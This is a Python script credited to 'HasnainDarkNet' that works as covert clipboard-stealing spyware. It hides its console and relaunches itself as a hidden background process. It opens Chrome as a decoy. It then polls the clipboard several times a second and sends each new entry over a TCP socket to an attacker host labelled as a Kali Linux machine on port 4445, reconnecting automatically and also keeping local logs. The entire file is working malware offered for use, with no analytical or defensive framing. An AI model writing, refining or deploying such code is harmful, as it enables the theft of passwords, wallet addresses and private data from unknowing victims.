#!/usr/bin/env python3

import pyperclip
import time
import socket
import threading
import os
import sys
import subprocess
from datetime import datetime
import signal
import webbrowser
                                        # HasnainDarkNet
KALI_IP = "Kali Linux Ip"
KALI_PORT = 4445
HIDE_WINDOW = True
OPEN_CHROME = True
CHROME_URL = "https://www.google.com"

class BackgroundClipboardMonitor:
    def __init__(self):
        self.last_text = ""
        self.running = True
        self.connected = False
        self.socket = None
        
    def open_chrome_background(self):
        if OPEN_CHROME:
            try:
                chrome_paths = [
                    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
                    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                    r"C:\Users\{}\AppData\Local\Google\Chrome\Application\chrome.exe".format(os.getenv('USERNAME'))
                ]
                
                chrome_exe = None
                for path in chrome_paths:
                    if os.path.exists(path):
                        chrome_exe = path
                        break
                
                if chrome_exe:
                    subprocess.Popen([chrome_exe, CHROME_URL, "--new-window", "--start-maximized"],
                                   creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
                    print("[✓] Chrome opened in background!")
                else:
                    webbrowser.open(CHROME_URL)
                    print("[✓] Default browser opened!")
                    
            except Exception as e:
                print(f"[!] Could not open Chrome: {e}")
                webbrowser.open(CHROME_URL)
    
    def hide_console(self):
        if sys.platform == "win32" and HIDE_WINDOW:
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
    
    def connect_to_kali(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.socket.connect((KALI_IP, KALI_PORT))
            self.connected = True
            self.send_message(f"[+] Clipboard Monitor Started from Chrome session")
            return True
        except Exception as e:
            self.connected = False
            return False
    
    def send_message(self, message):
        if self.connected and self.socket:
            try:
                self.socket.send(f"{message}\n".encode('utf-8'))
                return True
            except:
                self.connected = False
                return False
        return False
    
    def save_locally(self, data, timestamp):
        try:
            log_file = f"clipboard_backup_{datetime.now().strftime('%Y%m%d')}.txt"
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] {data}\n")
            return True
        except:
            return False
    
    def monitor_clipboard(self):
        self.open_chrome_background()
        
        log_file = f"clipboard_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        thread = threading.Thread(target=self.auto_reconnect, daemon=True)
        thread.start()
        
        with open(log_file, 'w', encoding='utf-8') as log:
            log.write(f"Session started at {datetime.now()}\n")
            log.write(f"Target: {KALI_IP}:{KALI_PORT}\n")
            log.write(f"Chrome URL: {CHROME_URL}\n")
            log.write("-" * 50 + "\n")
        
        try:
            while self.running:
                try:
                    current = pyperclip.paste()
                    
                    if current and current != self.last_text:
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        
                        self.save_locally(current, timestamp)
                        
                        with open(log_file, 'a', encoding='utf-8') as f:
                            f.write(f"[{timestamp}] {current}\n")
                        
                        if self.connected:
                            self.send_message(f"[{timestamp}] {current}")
                        
                        self.last_text = current
                    
                except Exception as e:
                    pass
                
                time.sleep(0.3)
                
        except KeyboardInterrupt:
            self.stop()
    
    def auto_reconnect(self):
        while self.running:
            if not self.connected:
                try:
                    if self.connect_to_kali():
                        pass
                except:
                    pass
            time.sleep(5)
    
    def stop(self):
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        sys.exit(0)

def run_as_background():
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    monitor = BackgroundClipboardMonitor()
    monitor.monitor_clipboard()

def main():
    try:
        import pyperclip
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyperclip"])
        print("Pyperclip installed! Restarting...")
        time.sleep(2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
    
    if HIDE_WINDOW and len(sys.argv) < 2:
        if sys.platform == "win32":
            subprocess.Popen([sys.executable, sys.argv[0], "hidden"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            print("[✓] Clipboard Monitor Started!")
            print("[✓] Chrome will open automatically!")
            print("[✓] Running in background...")
            time.sleep(3)
            sys.exit()
        else:
            if os.fork() == 0:
                run_as_background()
            else:
                print(f"[✓] Started in background (PID: {os.getpid()})")
                sys.exit()
    else:
        run_as_background()

if __name__ == "__main__":
    main()